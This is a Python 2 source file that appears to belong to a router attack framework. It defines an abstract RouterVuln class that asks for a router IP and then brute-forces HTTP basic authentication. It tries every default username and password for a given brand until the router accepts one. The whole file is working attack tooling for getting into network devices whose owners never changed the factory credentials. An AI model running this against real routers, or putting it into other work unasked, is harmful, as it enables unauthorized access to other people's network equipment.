import abc
import urllib2
from base64 import b64encode
from util import Msg
from default_passwords import default_list 

class RouterVuln(object):
	"""Abstract router vulnerability"""
	__metaclass__ = abc.ABCMeta

	def __init__(self):
		"""Initialize a default router IP and fetch IP from user"""
		self.ip = '192.168.1.1'
	
	@abc.abstractmethod
	def run(self):
		"""Runner for the menus"""
		pass	

	def fetch_ip(self):
		"""Fetch the router IP
		"""
		while True:
			try:
				tmp = raw_input('[!] Enter address of router [%s]: '%self.ip)
				if len(tmp.split('.')) is 4:
					self.ip = tmp
				break
			except KeyboardInterrupt:
				return
			except:
				continue

	def attempt_login(self, brand):
		""" Attempts to login to the router with default credentials. This will
			only work with routers that use HTTP basic auth.
			brand is the type of router being hit.  
			
			Useful for vulnerabilities that require authentication.
		"""
		try:
			Msg('Attempting to discover credentials for %s...'%self.ip)
			wordlist = default_list(brand)
			for username in wordlist['username']:
				for password in wordlist['password']:
					# look for a 200
					auth_string = b64encode('%s:%s'%(username,password)) 
					opener = urllib2.build_opener()
					opener.addheaders.append(('Authorization', 'Basic %s'%auth_string))

					try:
						response = opener.open('http://%s/'%self.ip)
						if response.getcode() is 200:
							Msg('Credentials found - %s:%s'%(username,password))
							return
					except urllib2.HTTPError, e:
						if e.code is 401: pass
			Msg('No credentials found.')	
		except Exception, e: print e
